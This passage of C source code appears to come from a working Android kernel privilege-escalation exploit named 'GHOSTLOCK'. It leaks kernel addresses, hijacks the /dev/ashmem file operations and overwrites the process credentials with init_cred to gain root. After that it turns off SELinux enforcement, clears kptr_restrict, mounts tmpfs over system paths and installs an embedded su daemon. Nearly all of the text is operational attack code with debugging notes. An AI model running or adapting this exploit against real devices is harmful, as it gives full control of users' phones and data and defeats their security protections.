    if (ioctl(hf, ASHMEM_SET_NAME, blob) != 0) {
      pr_error("hijack: setname errno=%d\n", errno);
      return 4;
    }
    /* Watchdog: a separate process that waits until both chains are done and
     * then exercises the (hopefully) hijacked /dev/ashmem.  If the main
     * process is taken down by an oops, this one still leaves the verdict. */
    pid_t wd = fork();
    if (wd == 0) {
      /* Short delay: measure how long the hijacked device survives, i.e.
       * whether a one-shot physrw window exists before the panic. */
      sleep(getenv("GHOSTLOCK_WD_SLEEP") ? (unsigned)atoi(getenv("GHOSTLOCK_WD_SLEEP")) : 2);
      errno = 0;
      int wfd = open(ashmem_path, O_RDWR | O_CLOEXEC);
      int woe = errno;
      errno = 0;
      int wr = wfd >= 0 ? ioctl(wfd, 0x7706) : -1;
      int wie = errno;
      int wout = open("/data/local/tmp/wd_res.txt",
                      O_WRONLY | O_CREAT | O_TRUNC, 0666);
      if (wout >= 0) {
        char b[128];
        int n = snprintf(b, sizeof b, "wd fd=%d oerr=%d ioctl=%d ierr=%d\n",
                         wfd, woe, wr, wie);
        ssize_t w = write(wout, b, (size_t)n);
        (void)w;
        close(wout);
        sync();
      }
      _exit(0);
    }
    char nb[64];
    setenv("GHOSTLOCK_SKIP_PAGE", "1", 1);
    setenv("GHOSTLOCK_NO_PROBE", "1", 1);
    /* SLOT_VTEST: write value=init_cred (a .data address, already proven as a
     * value) into the slot - isolates "value-write does not reach .data" from
     * "heap value is the problem". */
    int vtest = getenv("GHOSTLOCK_SLOT_VTEST") != NULL;
    if (!vtest) {
      snprintf(nb, sizeof nb, "0x%zx", (size_t)fops);
      setenv("GHOSTLOCK_ZWRITE2", nb, 1);
      setenv("GHOSTLOCK_ZWRITE_SLOT", "0", 1);
      run_main_route_threads();
    }
    unsetenv("GHOSTLOCK_ZWRITE2");
    /* .data lives in the kernel image mapping: use text_addr()/kaslr_base, NOT
     * data_addr()'s p0 physical alias (that alias faults at level 2 on this
     * device - it was the source of the black-screen crashes). */
    pr_info("hijack: slot=%016zx vtest=%d\n",
            (size_t)text_addr(ASHMEM_MISC_FOPS), vtest);
    snprintf(nb, sizeof nb, "0x%zx", (size_t)text_addr(ASHMEM_MISC_FOPS));
    setenv("GHOSTLOCK_VALUEWRITE", nb, 1);
    snprintf(nb, sizeof nb, "0x%zx",
             vtest ? (size_t)text_addr(INIT_CRED) : (size_t)fops);
    setenv("GHOSTLOCK_VALUEWRITE_PC", nb, 1);
    setenv("GHOSTLOCK_ZWRITE_SLOT", "1", 1);
    run_main_route_threads();
    /* Do the post-hijack open in a child: if the kernel oopses there, only the
     * child dies and this process can still report what happened. */
    const char *respath = "/data/local/tmp/hijack_res.txt";
    unlink(respath);
    pid_t ck = fork();
    if (ck == 0) {
      errno = 0;
      int nfd = open(ashmem_path, O_RDWR | O_CLOEXEC);
      int oe = errno;
      errno = 0;
      int r = nfd >= 0 ? ioctl(nfd, 0x7706) : -1;
      int ie = errno;
      int out = open(respath, O_WRONLY | O_CREAT | O_TRUNC, 0666);
      if (out >= 0) {
        char b[96];
        int n = snprintf(b, sizeof b, "fd=%d oerr=%d ioctl=%d ierr=%d\n",
                         nfd, oe, r, ie);
        ssize_t wr = write(out, b, (size_t)n);
        (void)wr;
        close(out);
        sync();
      }
      _exit(nfd >= 0 ? 0 : 1);
    }
    int st = 0;
    waitpid(ck, &st, 0);
    int child_sig = WIFSIGNALED(st) ? WTERMSIG(st) : 0;
    char rb[128];
    memset(rb, 0, sizeof rb);
    int rf = open(respath, O_RDONLY | O_CLOEXEC);
    ssize_t rn = rf >= 0 ? read(rf, rb, sizeof rb - 1) : -1;
    if (rf >= 0) close(rf);
    int ok0 = 0;
    if (rn > 0 && strstr(rb, "ioctl=0 ")) ok0 = 1;
    pr_success("hijack: fops=%016zx st=%#x sig=%d res=[%s] ok=%d\n",
               (size_t)fops, st, child_sig, rb, ok0);
    sync();
    _exit(ok0 ? 42 : 45);
  }

  /* GHOSTLOCK_VWRITE_SELFTEST=1: does the *value*-write path work?  Write
   * value=init_cred to target=init_uts_ns+4; sysname then holds the pointer
   * bytes, which uname() can see. */
  if (getenv("GHOSTLOCK_VWRITE_SELFTEST")) {
    pin_to_core(CORE);
    if (!slide_leak_kernel_base()) { pr_error("slide failed\n"); return 1; }
    struct utsname u0, u1;
    memset(&u0, 0, sizeof u0);
    memset(&u1, 0, sizeof u1);
    syscall(SYS_uname, &u0);
    char nb[64];
    setenv("GHOSTLOCK_SKIP_PAGE", "1", 1);
    setenv("GHOSTLOCK_NO_PROBE", "1", 1);
    int use_data = getenv("GHOSTLOCK_VWRITE_DATA") != NULL;
    uintptr_t tgt = (use_data ? data_addr(INIT_UTS_NS) : text_addr(INIT_UTS_NS)) + 4;
    snprintf(nb, sizeof nb, "0x%zx", (size_t)tgt);
    setenv("GHOSTLOCK_VALUEWRITE", nb, 1);
    pr_info("vwrite selftest: target=%016zx mode=%s\n", (size_t)tgt,
            use_data ? "data" : "text");
    if (getenv("GHOSTLOCK_VWRITE_USE_ASMA")) {
      /* Use a leaked *heap* pointer as the written value: does the value path
       * work at all with a non-image address? */
      extern uintptr_t perf_regs_asma_leak(int afd);
      int af = open_ashmem_device();
      uintptr_t av = af >= 0 ? perf_regs_asma_leak(af) : 0;
      pr_info("vwrite selftest: asma value=%016zx\n", (size_t)av);
      if (!av) { _exit(47); }
      snprintf(nb, sizeof nb, "0x%zx", (size_t)av);
      setenv("GHOSTLOCK_VALUEWRITE_PC", nb, 1);
    } else if (getenv("GHOSTLOCK_VWRITE_VALUE")) {
      setenv("GHOSTLOCK_VALUEWRITE_PC", getenv("GHOSTLOCK_VWRITE_VALUE"), 1);
    } else {
      unsetenv("GHOSTLOCK_VALUEWRITE_PC");
    }
    setenv("GHOSTLOCK_ZWRITE_SLOT", "0", 1);
    run_main_route_threads();
    syscall(SYS_uname, &u1);
    pr_success("vwrite selftest: before=[%s] after=[%s]\n", u0.sysname, u1.sysname);
    sync();
    _exit(u1.sysname[0] != 0 && strcmp(u0.sysname, u1.sysname) != 0 ? 42 : 45);
  }

  /* GHOSTLOCK_CHAIN_SELFTEST=1: prove that the pselect chain really writes,
   * using the known-good target init_uts_ns+4 (zeroing sysname).  The result
   * is checked in-process with uname(), so no log file is needed. */
  if (getenv("GHOSTLOCK_CHAIN_SELFTEST")) {
    pin_to_core(CORE);
    if (!slide_leak_kernel_base()) { pr_error("slide failed\n"); return 1; }
    struct utsname u0, u1;
    memset(&u0, 0, sizeof u0);
    memset(&u1, 0, sizeof u1);
    syscall(SYS_uname, &u0);
    char nb[64];
    setenv("GHOSTLOCK_SKIP_PAGE", "1", 1);
    setenv("GHOSTLOCK_NO_PROBE", "1", 1);
    snprintf(nb, sizeof nb, "0x%zx", (size_t)text_addr(INIT_UTS_NS) + 4);
    setenv("GHOSTLOCK_ZWRITE2", nb, 1);
    setenv("GHOSTLOCK_ZWRITE_SLOT", "0", 1);
    run_main_route_threads();
    syscall(SYS_uname, &u1);
    pr_success("chain selftest: before=[%s] after=[%s]\n", u0.sysname, u1.sysname);
    sync();
    _exit(u1.sysname[0] == 0 ? 42 : 45);
  }

  /* GHOSTLOCK_ASMA_VERIFY=1: leak the ashma address, then prove it with a
   * single kernel write - /proc/self/fdinfo/<fd> shows "name:\t<name>", so
   * zeroing the first 8 name bytes in the kernel is directly observable. */
  if (getenv("GHOSTLOCK_ASMA_VERIFY")) {
    pin_to_core(CORE);
    if (!slide_leak_kernel_base()) { pr_error("slide failed\n"); return 1; }
    extern uintptr_t perf_regs_asma_leak(int afd);
    int vf = open_ashmem_device();
    char nm[ASHMEM_NAME_LEN];
    memset(nm, 0, sizeof nm);
    strcpy(nm, "GLVERIFY1234");
    if (vf < 0 || ioctl(vf, ASHMEM_SET_NAME, nm) != 0) {
      pr_error("asma verify: open/setname failed errno=%d\n", errno);
      return 3;
    }
    char p[64], before[256], after[256];
    snprintf(p, sizeof p, "/proc/self/fdinfo/%d", vf);
    int ff = open(p, O_RDONLY | O_CLOEXEC);
    ssize_t bn = ff >= 0 ? read(ff, before, sizeof before - 1) : -1;
    if (ff >= 0) close(ff);
    if (bn > 0) before[bn] = 0; else before[0] = 0;
    extern uintptr_t perf_regs_asma_leak_mmap(int afd);
    ioctl(vf, 0x7704, (unsigned long)4096);   /* ASHMEM_SET_SIZE */
    uintptr_t asma = perf_regs_asma_leak(vf);
    uintptr_t asma_m = perf_regs_asma_leak_mmap(vf);
    pr_info("asma xcheck: ioctl=%016zx mmap=%016zx\n", (size_t)asma, (size_t)asma_m);
    /* The leak loop itself SET_NAMEs "AAAA...", so restore our marker before
     * the before/after comparison. */
    if (ioctl(vf, ASHMEM_SET_NAME, nm) != 0) {
      pr_error("asma verify: restore setname failed errno=%d\n", errno);
      return 5;
    }
    ff = open(p, O_RDONLY | O_CLOEXEC);
    bn = ff >= 0 ? read(ff, before, sizeof before - 1) : -1;
    if (ff >= 0) close(ff);
    if (bn > 0) before[bn] = 0; else before[0] = 0;
    pr_info("asma verify: asma=%016zx fdinfo=[%s]\n", (size_t)asma, before);
    if (!asma) return 4;
    char nb[64];
    setenv("GHOSTLOCK_SKIP_PAGE", "1", 1);
    setenv("GHOSTLOCK_NO_PROBE", "1", 1);
    snprintf(nb, sizeof nb, "0x%zx", (size_t)asma);
    setenv("GHOSTLOCK_ZWRITE2", nb, 1);
    setenv("GHOSTLOCK_ZWRITE_SLOT", "0", 1);
    run_main_route_threads();
    ff = open(p, O_RDONLY | O_CLOEXEC);
    ssize_t an = ff >= 0 ? read(ff, after, sizeof after - 1) : -1;
    if (ff >= 0) close(ff);
    if (an > 0) after[an] = 0; else after[0] = 0;
    pr_success("asma verify: after=[%s]\n", after);
    int changed = strstr(before, "GLVERIFY1234") && !strstr(after, "GLVERIFY1234");
    sync();
    _exit(changed ? 42 : 45);
  }

  /* GHOSTLOCK_ASMA_LEAK=1: leak struct ashmem_area (kmalloc-512) addresses
   * for two independent /dev/ashmem fds.  No kernel writes at all. */
  if (getenv("GHOSTLOCK_ASMA_LEAK")) {
    pin_to_core(CORE);
    if (!slide_leak_kernel_base()) { pr_error("slide failed\n"); return 1; }
    extern uintptr_t perf_regs_asma_leak(int afd);
    int a1 = open_ashmem_device();
    int a2 = open_ashmem_device();
    char nm[ASHMEM_NAME_LEN];
    memset(nm, 0x42, sizeof nm - 1);
    nm[sizeof nm - 1] = 0;
    if (a1 >= 0) ioctl(a1, ASHMEM_SET_NAME, nm);
    if (a2 >= 0) ioctl(a2, ASHMEM_SET_NAME, nm);
    uintptr_t s1 = a1 >= 0 ? perf_regs_asma_leak(a1) : 0;
    uintptr_t s2 = a2 >= 0 ? perf_regs_asma_leak(a2) : 0;
    pr_success("asma leak: fds=%d/%d asma1=%016zx asma2=%016zx delta=%ld\n",
               a1, a2, (size_t)s1, (size_t)s2, (long)(s2 - s1));
    if (!s1 || !s2) _exit(43);
    if (!getenv("GHOSTLOCK_ASMA_HIJACK")) _exit(s1 != s2 ? 42 : 44);
    if (s1 == s2) _exit(44);
    /* Two-chain hijack.  The fake file_operations lives at asma+8 (name[0..7]
     * is the string's leading filler, so the whole blob can be written with a
     * single SET_NAME - no interior NUL bytes).  Every field is a valid kernel
     * pointer except owner, which misc_open()'s try_module_get() would
     * dereference: it is a non-zero placeholder in the string and gets zeroed
     * by the first chain. */
    uintptr_t fops = s1 + 8;
    unsigned char blob[ASHMEM_NAME_LEN];
    memset(blob, 0, sizeof blob);
    memset(blob, 'A', 8);
    uint64_t nz = text_addr(NOOP_LLSEEK_OFF);
    for (size_t off = FOPS_LLSEEK_OFF; off <= FOPS_SHOW_FDINFO_OFF; off += 8) {
      put64(blob, 8 + off, nz);
    }
    put64(blob, 8 + FOPS_OWNER_OFF, 0x4141414141414141ULL);
    /* Keep open/release/mmap/show_fdinfo as noop_llseek as well: they are then
     * harmless (noop_llseek only reads file->f_pos) and misc_open()'s call to
     * f_op->open() returns 0, so the new fd really gets our fops without
     * running ashmem_open() against the misc device's inode (that oopsed). */
    put64(blob, 8 + FOPS_MMAP_OFF, nz);
    put64(blob, 8 + FOPS_OPEN_OFF, nz);
    put64(blob, 8 + FOPS_RELEASE_OFF, nz);
    put64(blob, 8 + FOPS_SHOW_FDINFO_OFF, nz);
    if (ioctl(a1, ASHMEM_SET_NAME, blob) != 0) {
      pr_error("asma hijack: SET_NAME failed errno=%d\n", errno);
      _exit(46);
    }
    char nb[64];
    setenv("GHOSTLOCK_SKIP_PAGE", "1", 1);
    setenv("GHOSTLOCK_NO_PROBE", "1", 1);
    /* chain A: owner = NULL */
    snprintf(nb, sizeof nb, "0x%zx", (size_t)fops);
    setenv("GHOSTLOCK_ZWRITE2", nb, 1);
    setenv("GHOSTLOCK_ZWRITE_SLOT", "0", 1);
    run_main_route_threads();
    if (getenv("GHOSTLOCK_ASMA_NOFOPS")) {
      pr_success("asma ztest: zero-write at %016zx ok, no hijack\n", (size_t)fops);
      sync();
      _exit(42);
    }
    /* chain B: ashmem_misc.fops = fops */
    unsetenv("GHOSTLOCK_ZWRITE2");
    /* .data lives in the kernel image mapping: use text_addr()/kaslr_base, NOT
     * data_addr()'s p0 physical alias (that alias faults at level 2 on this
     * device - it was the source of the black-screen crashes). */
    pr_info("hijack: slot=%016zx\n", (size_t)text_addr(ASHMEM_MISC_FOPS));
    snprintf(nb, sizeof nb, "0x%zx", (size_t)text_addr(ASHMEM_MISC_FOPS));
    setenv("GHOSTLOCK_VALUEWRITE", nb, 1);
    snprintf(nb, sizeof nb, "0x%zx", (size_t)fops);
    setenv("GHOSTLOCK_VALUEWRITE_PC", nb, 1);
    setenv("GHOSTLOCK_ZWRITE_SLOT", "1", 1);
    run_main_route_threads();
    int nfd = open(ashmem_path, O_RDWR | O_CLOEXEC);
    errno = 0;
    int got = nfd >= 0 ? ioctl(nfd, 0x7706) : -999;
    int gerr = errno;
    pr_success("asma hijack: fops=%016zx newfd=%d ioctl=%d errno=%d (ok=0, real=7)\n",
               (size_t)fops, nfd, got, gerr);
    sync();
    _exit(nfd >= 0 && got == 0 ? 42 : 45);
  }

  pin_to_core(CORE);
  if (!slide_leak_kernel_base()) {
    pr_error("slide kaslr leak failed\n");
    return 1;
  }
  if (getenv("GHOSTLOCK_SLIDE_ONLY")) {
    pr_success("slide-only mode: stopping before any kernel write\n");
    return 0;
  }

  /* GHOSTLOCK_PAGE_TEST=1: can we own a controlled page at the cred slab
   * page's address?  The cred cache is order-0 (21 objects/page), so if we
   * surround our own cred with children's creds and then free them all, the
   * page goes back to the buddy and a pipe data page can take its place -
   * giving us page contents we fully control at a known kernel address. */
  if (getenv("GHOSTLOCK_PAGE_TEST")) {
    enum { NCH = 900, NP = 128 };
    /* cred_jar snapshots from /proc/slabinfo: active_objs / num_objs / slabs */
    struct credslab { int a, n, s; } cs[4] = {{0,0,0},{0,0,0},{0,0,0},{0,0,0}};
    for (int si = 0; si < 4; si++) {
      int fd = open("/proc/slabinfo", O_RDONLY | O_CLOEXEC);
      if (fd < 0) break;
      static char sbuf[1 << 16];
      ssize_t got = read(fd, sbuf, sizeof(sbuf) - 1);
      close(fd);
      if (got <= 0) break;
      sbuf[got] = 0;
      char *line = strstr(sbuf, "cred_jar");
      if (!line) break;
      int a = 0, n = 0;
      if (sscanf(line, "cred_jar %d %d", &a, &n) == 2) {
        cs[si].a = a;
        cs[si].n = n;
      }
    }
    pr_info("page test: slab before a=%d n=%d s=%d\n", cs[0].a, cs[0].n, cs[0].s);
    static pid_t kids[NCH];
    for (int i = 0; i < NCH; i++) {
      pid_t c = fork();
      if (c == 0) {
        for (;;) pause();
      }
      kids[i] = c;
    }
    usleep(300000);
    setuid(getuid());            /* take a fresh cred in the hot slab */
    extern uintptr_t perf_regs_cred_leak(uintptr_t task);
    uintptr_t cl = perf_regs_cred_leak(0);
    uintptr_t cpage = cl & ~(uintptr_t)0xfff;
    pr_info("page test: cred=%016zx page=%016zx\n", cl, cpage);
    /* Take a *new* cred so the one we just leaked (which sits on the page we
     * want) is freed - otherwise that page can never become empty. */
    setuid(getuid());
    usleep(100000);
    for (int i = 0; i < NCH; i++) kill(kids[i], SIGKILL);
    for (int i = 0; i < NCH; i++) waitpid(kids[i], NULL, 0);
    usleep(500000);
    /* push the cred cache over min_partial so empty slabs really go back to
     * the buddy: churn a second batch of short-lived children */
    for (int round = 0; round < 3; round++) {
      pid_t tmp[300];
      for (int i = 0; i < 300; i++) {
        pid_t c = fork();
        if (c == 0) _exit(0);
        tmp[i] = c;
      }
      for (int i = 0; i < 300; i++) waitpid(tmp[i], NULL, 0);
    }
    usleep(300000);
    int pfds[NP][2];
    unsigned char buf[4096];
    memset(buf, 0xA5, sizeof buf);
    int made = 0;
    for (int i = 0; i < NP; i++) {
      if (pipe(pfds[i]) != 0) break;
      /* Keep the pipe fds out of 0..319: the pselect fd_set spray dup2()s
       * over that whole range and would otherwise clobber them. */
      int rfd = fcntl(pfds[i][0], F_DUPFD, 400);
      int wfd = fcntl(pfds[i][1], F_DUPFD, 600);
      close(pfds[i][0]);
      close(pfds[i][1]);
      if (rfd < 0 || wfd < 0) break;
      pfds[i][0] = rfd;
      pfds[i][1] = wfd;
      fcntl(pfds[i][0], F_SETFL, O_NONBLOCK);
      fcntl(pfds[i][1], F_SETPIPE_SZ, 4096);
      if (write(pfds[i][1], buf, sizeof buf) != (ssize_t)sizeof buf) break;
      made++;
    }
    pr_info("page test: pipes=%d, zero-write at page base\n", made);
    char nb[64];
    snprintf(nb, sizeof nb, "0x%zx", (size_t)cpage);
    setenv("GHOSTLOCK_SKIP_PAGE", "1", 1);
    setenv("GHOSTLOCK_NO_PROBE", "1", 1);
    setenv("GHOSTLOCK_ZWRITE2", nb, 1);
    setenv("GHOSTLOCK_ZWRITE_SLOT", "0", 1);
    run_main_route_threads();
    int found = -1;
    for (int i = 0; i < made; i++) {
      unsigned char rb[16];
      ssize_t n = read(pfds[i][0], rb, sizeof rb);
      if (n >= 8) {
        int z = 1;
        for (int k = 0; k < 8; k++) if (rb[k] != 0) { z = 0; break; }
        if (z) { found = i; break; }
      }
    }
    pr_success("page test: checked %d pipes, found=%d\n", made, found);
    _exit(found >= 0 ? (1 | (found << 1)) : 0);
  }

  /* The old value-write attempt is unsafe: it overwrites neighboring
   * selinux_state fields, including policycap bytes. Use the physrw path for
   * the single-byte SELINUX_ENFORCING write instead. */
  if (getenv("GHOSTLOCK_PERMISSIVE")) {
    pr_error("GHOSTLOCK_PERMISSIVE disabled: 8-byte value-write corrupts adjacent selinux_state fields\n");
    _exit(125);
  }

  /* GHOSTLOCK_TASK_LEAK=1: recover this thread's task_struct address from
   * perf register samples (arm64 loads current into a GPR in every syscall
   * wrapper, so the most frequent linear-map pointer is our task).  With
   * GHOSTLOCK_TASK_WRITE=1 two chains follow, each in its own empty_zero_page
   * slot: first zero task->comm to prove the address, then write the value
   * init_cred into task->cred (= uid 0 with full caps). */
  if (getenv("GHOSTLOCK_TASK_LEAK")) {
    extern uintptr_t perf_regs_task_leak(void);
    extern uintptr_t perf_task_from_sched(void);
    uintptr_t tl;
    if (getenv("GHOSTLOCK_TASK_LEAK") &&
        !strcmp(getenv("GHOSTLOCK_TASK_LEAK"), "sched")) {
      tl = perf_task_from_sched();
    } else {
      tl = perf_regs_task_leak();
    }
    pr_info("task leak: candidate=%016zx\n", tl);
    if (tl && getenv("GHOSTLOCK_TASK_WRITE") &&
        !strcmp(getenv("GHOSTLOCK_TASK_WRITE"), "value")) {
      /* Isolation run: identical value-write path, harmless target. */
      char nb[64];
      setenv("GHOSTLOCK_SKIP_PAGE", "1", 1);
      snprintf(nb, sizeof nb, "0x%zx", (size_t)(text_addr(INIT_UTS_NS) + 0x100));
      setenv("GHOSTLOCK_VALUEWRITE", nb, 1);
      setenv("GHOSTLOCK_ZWRITE_SLOT", "0", 1);
      run_main_route_threads();
      pr_success("value-only write finished\n");
      return 0;
    }
    if (tl && getenv("GHOSTLOCK_TASK_WRITE") &&
        !strcmp(getenv("GHOSTLOCK_TASK_WRITE"), "uid")) {
      /* Practical-root variant: keep our own cred (so SELinux keeps the shell
       * SID) and just zero its uid/gid/euid/egid/fsuid/fsgid fields. */
      extern uintptr_t perf_regs_cred_leak(uintptr_t task);
      /* The cred slab filter already excludes task_struct, so the task
       * address is not needed here (and its leak is unreliable anyway). */
      uintptr_t cl = perf_regs_cred_leak(0);
      pr_info("uid mode: task=%016zx cred=%016zx\n", tl, cl);
      if (getenv("GHOSTLOCK_LEAK_ONLY")) {
        return 0;
      }
      if (cl) {
        char nb[64];
        setenv("GHOSTLOCK_SKIP_PAGE", "1", 1);
        setenv("GHOSTLOCK_NO_PROBE", "1", 1);
        setenv("GHOSTLOCK_ZWRITE_SLOT", "0", 1);
        int nfields = 4;
        size_t first = 4;
        int only = -1;
        if (getenv("GHOSTLOCK_UID_ONLY")) only = atoi(getenv("GHOSTLOCK_UID_ONLY"));
        if (getenv("GHOSTLOCK_UID_OFF")) {
          first = (size_t)strtoul(getenv("GHOSTLOCK_UID_OFF"), NULL, 0);
          only = 0;
          nfields = 1;
        }
        for (int k = only >= 0 ? only : 0; k < (only >= 0 ? only + 1 : nfields); k++) {
          snprintf(nb, sizeof nb, "0x%zx", (size_t)(cl + first + (k - (only >= 0 ? only : 0)) * 8));
          setenv("GHOSTLOCK_ZWRITE2", nb, 1);
          setenv("GHOSTLOCK_ZWRITE_SLOT", k == 0 ? "0" : (k == 1 ? "1" : (k == 2 ? "2" : "3")), 1);
          /* All four chains run in this very task: fork() would give the
           * child its own copy of the cred, so the write would not affect the
           * parent. run_main_route_threads() now joins every thread of a round
           * and the owner releases both futexes, so rounds are reentrant. */
          run_main_route_threads();
          pr_info("uid mode: chain %d done uid=%d\n", k, (int)getuid());
        }
        int bits = 0;
        if (getuid() == 0) bits |= 1;
        int pf = open("/data/local/tmp/uidproof", O_CREAT | O_WRONLY | O_TRUNC, 0644);
        if (pf >= 0) { bits |= 2; write(pf, "hi\n", 3); close(pf); }
        pr_success("uid mode: uid=%d euid=%d bits=%d\n",
                   (int)getuid(), (int)geteuid(), bits);
        _exit(bits);
      }
      return 0;
    }
    if (tl && getenv("GHOSTLOCK_TASK_WRITE") &&
        !strcmp(getenv("GHOSTLOCK_TASK_WRITE"), "cred")) {
      char nb[64];
      setenv("GHOSTLOCK_SKIP_PAGE", "1", 1);
      /* chain 1: zero task->comm to prove the leaked task address */
      snprintf(nb, sizeof nb, "0x%zx", (size_t)(tl + TASK_COMM_OFF));
      setenv("GHOSTLOCK_ZWRITE2", nb, 1);
      setenv("GHOSTLOCK_ZWRITE_SLOT", "0", 1);
      run_main_route_threads();
      char comm[64];
      memset(comm, 0, sizeof comm);
      int cfd = open("/proc/self/comm", O_RDONLY);
      int cn = cfd >= 0 ? (int)read(cfd, comm, sizeof(comm) - 1) : -1;
      if (cfd >= 0) close(cfd);
      pr_info("cred: comm proof '%s' n=%d\n", comm, cn);
      if (!(cn >= 0 && (cn == 0 || comm[0] == '\n'))) {
        pr_error("cred: task address not confirmed, aborting\n");
        return 0;
      }
      if (getenv("GHOSTLOCK_COMM_ONLY")) {
        pr_success("comm-only: target task address confirmed; stopping before cred writes\n");
        return 0;
      }
      unsetenv("GHOSTLOCK_ZWRITE2");
      snprintf(nb, sizeof nb, "0x%zx", (size_t)tl);
      setenv("GHOSTLOCK_CREDWRITE", nb, 1);
      /* chain 2: task->real_cred = init_cred */
      setenv("GHOSTLOCK_CREDWRITE_OFF", "0x818", 1);
      setenv("GHOSTLOCK_ZWRITE_SLOT", "1", 1);
      run_main_route_threads();
      pr_info("cred: step1 real_cred ok\n");
      /* chain 3: task->cred = init_cred */
      setenv("GHOSTLOCK_CREDWRITE_OFF", "0x660", 1);
      setenv("GHOSTLOCK_ZWRITE_SLOT", "2", 1);
      run_main_route_threads();
      int gotuid = (int)getuid();
      /* GHOSTLOCK_SU=1: replicate the original's post-root step - mount a
       * tmpfs over /apex/com.android.virt/bin, drop the embedded su there and
       * start it as a daemon (the kernel SID is allowed to do this). */
      if (getenv("GHOSTLOCK_MOUNT_WRITE")) {
        /* Minimal test: mount a tmpfs at <path>, then create/write a file in
         * it from the kernel domain, then unmount and report via exit bits:
         * bit0 mount ok, bit1 create ok, bit2 write ok, bit3 access ok. */
        const char *p = getenv("GHOSTLOCK_MOUNT_WRITE");
        errno = 0;
        int mr = mount("tmpfs", p, "tmpfs", 0, "mode=0777,size=4m");
        int mbits = mr == 0 ? 1 : 0;
        if (mr == 0) {
          char path[128];
          snprintf(path, sizeof path, "%s/ghostproof", p);
          errno = 0;
          int fd = open(path, O_CREAT | O_WRONLY | O_TRUNC, 0666);
          if (fd >= 0) {
            mbits |= 2;
            if (write(fd, "hi\n", 3) == 3) mbits |= 4;
            close(fd);
            if (access(path, F_OK) == 0) mbits |= 8;
          }
          umount2(p, MNT_DETACH);
        }
        _exit(mbits & 0xff);
      }
      if (getenv("GHOSTLOCK_MOUNT_EXEC")) {
        /* Replicate the original's mount + write + exec step with a safe
         * mount point: shadow /data/local/tmp with a fresh tmpfs, then run a
         * shell in the kernel domain and let it touch/exec files there. */
        const char *p = getenv("GHOSTLOCK_MOUNT_EXEC");
        errno = 0;
        int mr = mount("tmpfs", p, "tmpfs", 0, "mode=0777,size=4m");
        int mbits = mr == 0 ? 1 : 0;
        if (mr == 0) {
          pid_t c = fork();
          if (c == 0) {
            execl("/system/bin/sh", "sh", "-c",
                  "echo hi > /data/local/tmp/proof; "
                  "cp /system/bin/sh /data/local/tmp/mysh; "
                  "chmod 755 /data/local/tmp/mysh; "
                  "/data/local/tmp/mysh -c 'true'",
                  (char *)NULL);
            _exit(127);
          }
          int st = 0;
          waitpid(c, &st, 0);
          if (access("/data/local/tmp/proof", F_OK) == 0) mbits |= 2;
          if (access("/data/local/tmp/mysh", F_OK) == 0) mbits |= 4;
          if (st == 0) mbits |= 8;
          umount2(p, MNT_DETACH);
        }
        _exit(mbits & 0xff);
      }
      if (getenv("GHOSTLOCK_MOUNT_ONE")) {
        const char *p = getenv("GHOSTLOCK_MOUNT_ONE");
        mkdir(p, 0755);
        errno = 0;
        int r = mount("tmpfs", p, "tmpfs", 0, "mode=0755,size=1m");
        if (r == 0) {
          umount2(p, MNT_DETACH);
          _exit(0);
        }
        _exit(errno & 0xff);
      }
      if (getenv("GHOSTLOCK_MOUNT_PROBE")) {
        const char *cands[] = {
          "/apex/com.android.runtime/bin", "/apex/com.android.art/bin",
          "/apex/com.android.virt/bin", "/apex/com.android.conscrypt/bin",
          "/mnt", "/data/local/tmp/mnt", NULL,
        };
        int mbits = 0;
        for (int i = 0; cands[i]; i++) {
          mkdir(cands[i], 0755);
          errno = 0;
          int r = mount("tmpfs", cands[i], "tmpfs", 0, "mode=0755,size=1m");
          int e = errno;
          pr_info("mount probe: %s -> %d errno=%d\n", cands[i], r, e);
          if (r == 0) {
            mbits |= (1 << i);
            umount2(cands[i], MNT_DETACH);
          }
        }
        _exit(mbits & 0xff);
      }
      if (getenv("GHOSTLOCK_SU")) {
        pid_t dpid = -1;
        errno = 0;
        int sok = install_embedded_su(&dpid);
        int serr = errno;
        pr_success("su install: ok=%d daemon=%d errno=%d uid=%d\n",
                   sok, (int)dpid, serr, gotuid);
      }
      /* Encode what a uid-0 task with init_cred's caps can actually do.
       * bit0 uid==0, bit1 enforce opened, bit2 enforce written,
       * bit3 tmp file created, bit4 chown ok, bit5 /data/system read,
       * bit6 exec of /system/bin/sh started. */
      int bits = 0;
      if (gotuid == 0) bits |= 1;
      if (getenv("GHOSTLOCK_ENFORCE_ERRNO")) {
        int e1 = open("/sys/fs/selinux/enforce", O_WRONLY);
        if (e1 < 0) _exit(100 + (errno & 0x3f));
        ssize_t w1 = write(e1, "0", 1);
        int we = errno;
        if (w1 == 1) _exit(0);
        _exit(150 + (we & 0x3f));
      }
      int efd = open("/sys/fs/selinux/enforce", O_WRONLY);
      if (efd >= 0) {
        bits |= 2;
        if (write(efd, "0", 1) == 1) bits |= 4;
        close(efd);
      }
      int kfd = open("/dev/kmsg", O_WRONLY);
      if (kfd >= 0) {
        bits |= 256;
        if (write(kfd, "GHOSTLOCK_ROOT\n", 15) == 15) bits |= 512;
        close(kfd);
      }
      if (mkdir("/data/local/tmp/mnt", 0777) == 0 || errno == 17) {
        if (mount("none", "/data/local/tmp/mnt", "tmpfs", 0, "mode=0777") == 0) bits |= 1024;
      }
      int kp = open("/proc/sys/kernel/kptr_restrict", O_WRONLY);
      if (kp >= 0 && write(kp, "0", 1) == 1) bits |= 2048;
      if (kp >= 0) close(kp);
      int bf = open("/dev/block/by-name/boot", O_RDONLY);
      if (bf >= 0) { bits |= 4096; close(bf); }
      int ks = open("/proc/kallsyms", O_RDONLY);
      if (ks >= 0) { bits |= 8192; close(ks); }
      int pf = open("/data/local/tmp/rootproof", O_CREAT | O_WRONLY | O_TRUNC, 0644);
      if (pf >= 0) {
        bits |= 8;
        if (write(pf, "root\n", 5) == 5) bits |= 64;
        close(pf);
        if (chown("/data/local/tmp/rootproof", 0, 0) == 0) bits |= 16;
      }
      int sf = open("/data/system/users/0.xml", O_RDONLY);
      if (sf >= 0) { bits |= 32; close(sf); }
      pr_success("cred: uid=%d bits=%d\n", gotuid, bits);
      if (getenv("GHOSTLOCK_EXEC_SH")) {
        pid_t c = fork();
        if (c == 0) {
          char *argv[] = { "/system/bin/sh", "-c", "id > /data/local/tmp/root_id.txt 2>&1", NULL };
          execve("/system/bin/sh", argv, NULL);
          _exit(99);
        }
        int st = 0;
        waitpid(c, &st, 0);
        bits |= 128;
        bits += (st & 0xff) << 8;
      }
      if (getenv("GHOSTLOCK_HOLD")) {
        int secs = atoi(getenv("GHOSTLOCK_HOLD"));
        if (secs < 1) secs = 30;
        sleep((unsigned)secs);
      }
